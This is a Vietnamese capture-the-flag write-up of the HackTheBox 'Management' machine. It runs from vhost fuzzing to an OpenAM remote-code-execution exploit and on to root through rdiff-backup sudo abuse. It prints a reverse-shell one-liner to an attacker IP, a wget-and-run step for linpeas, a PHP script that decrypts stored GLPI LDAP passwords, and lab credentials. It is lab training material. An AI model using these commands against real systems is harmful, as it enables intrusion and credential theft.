

![[Pasted image 20261001072047.png]]

# Link máy: https://app.hackthebox.com/machines/Management?sort_by=created_at&sort_type=desc


# Véc tơ tấn công: Nmap -> cổng web 80,443,22 và có domain name management.htb -> vhost enumeration -> phát hiện sso.management.htb đang chạy openAM -> lỗ hổng unauthenticated Remote Code Execusion -> reverse shell gain foothold openam -> Enumerate hệ thống thì thấy chạy glpi database và file config chứa credentials của nó và glpi key -> đăng nhập thì thấy LDAP -> kết hợp với glpi key để ra được mật khẩu của user owen -> ssh vào foothold của owen -> sudo -l -> câu lệnh root-backup chạy được với quyền root -> backup được root folder -> key-rsa của root -> root (hoặc đơn giản là đọc luôn root flag)


# 1. Nmap scan


![[Pasted image 20261001141929.png]]

- Nhận xét về host:
	- port 22: chạy ssh chưa có gì cả
	- port 80,443: chạy web server với DNS management.htb.

Lưu vào host

```bash
sudo nano /etc/hosts
```
![[Pasted image 20261001142208.png]]


# 2. Web Enumeration

![[Pasted image 20261001142324.png]]


- theo phong cách của tôi thì trước tiên phải tìm ra vhost cái đã

Sau 30 phút tìm kiếm vhost câu lệnh phù hợp của tôi =))
```bash
ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u https://management.htb/ -H 'Host: FUZZ.management.htb' -fs 178
```


![[Pasted image 20261001144503.png]]



- có vẻ như có 1 vhost là sso.management.htb



lưu lại vhost
![[Pasted image 20261001144602.png]]


sso.management.htb
![[Pasted image 20261001144711.png]]


hmmm openAM


![[Pasted image 20261001144743.png]]


hmm chạy bản 16.0.5

 [CVE-2026-33439](https://github.com/advisories/GHSA-2cqq-rpvq-g5qj) có vẻ như nó bị lỗ hổng này


script POC python 
[Python POC](https://github.com/infernosalex/CVE-2026-33439-Python-PoC)

# 3. foothold as openam


- sử dụng POC trên và tiêm lệnh reverse shell ta sẽ lấy được shell của openam

Đặt listener
![[Pasted image 20261001145432.png]]


```bash
git clone https://github.com/infernosalex/CVE-2026-33439-Python-PoC.git
cd CVE-2026-33439-Python-PoC
python3 exploit.py --url https://sso.management.htb/open  
am/ui/PWResetUserValidation "bash -c 'bash -i >& /dev/tcp/10.1  
0.17.173/1234 0>&1'"
```


POC
![[Pasted image 20261001150052.png]]


stable shell
![[Pasted image 20261001150157.png]]


```
lệnh stable shell
python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl + Z
stty raw -echo && fg
enter 2 lần
export TERM=xterm
```


# 4. foothold as owen

Tải file linpeas và thực thi lên máy nạn nhân để thực hiện tự động system enumeration
```
Attacker:
python3 -m http.server 2222
Victim:
wget http://<attacker-ip>:2222/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

kết quả là đang chạy glpi và có file config chứa credential database. Ngoài ra, tôi còn phát hiện glpi_key
![[Pasted image 20261001150917.png]]



Đăng nhập vào database thì tôi thấy rằng glpi đang có LDAP và tôi nhờ AI viết script thực hiện recover password


truy cập database
![[Pasted image 20261001151556.png]]



LDAP và encrypted password
![[Pasted image 20261001151648.png]]

avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==



script sử dụng
```php
<?php

require_once '/opt/glpi/vendor/autoload.php';
require_once '/opt/glpi/src/GLPIKey.php';

$encrypted = $argv[1] ?? '';

if ($encrypted === '') {
    die("Usage: php script.php '<encrypted_value>'\n");
}

$glpi = new GLPIKey('/opt/glpi/config');

$key = file_get_contents('/opt/glpi/config/glpicrypt.key');

if (strlen($key) !== SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES) {
    die("Invalid GLPI key\n");
}

try {
    $result = $glpi->decrypt($encrypted, $key);
    echo $result . PHP_EOL;
} catch (Throwable $e) {
    echo "ERROR: " . $e->getMessage() . PHP_EOL;
}
```

![[Pasted image 20261001152601.png]]

có credential owen:WpczC40GhTbk

ssh vào thôi
![[Pasted image 20261001152732.png]]


# 5. Privilege Escalation (foothold as root)

khi 
```bash
sudo -l
```

tôi thấy
![[Pasted image 20261001152908.png]]


well sử dụng AI thì tôi biết rdiff-backup có thể dùng với root để tạo ra server chứa các file trên root và lưu vào file writeable khác và được quyền read-only và dấu * ở cuối khiến tôi muốn command abuse 
```bash
mkdir /tmp/root
rdiff-backup --new \ --remote-schema '{h}' \ backup \ 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /root'::/root \ /tmp/root
```


về cơ bản là mình abuse command và cho thêm restricted path là /root khiến cho nó tạo ra 1 server backup trên root => lấy được các file trên root và được gắn quyền là read-only

=> /tmp/root chứa mọi thông tin /root => id_rsa => rooooooot!!
![[Pasted image 20261001154625.png]]

![[Pasted image 20261001154551.png]]



# Các kỹ thuật sử dụng


- Nmap Enumeration
- Vhost fuzzing
- CVEs
- LDAP decryption
- Local Privilege Escalation (Command abuse)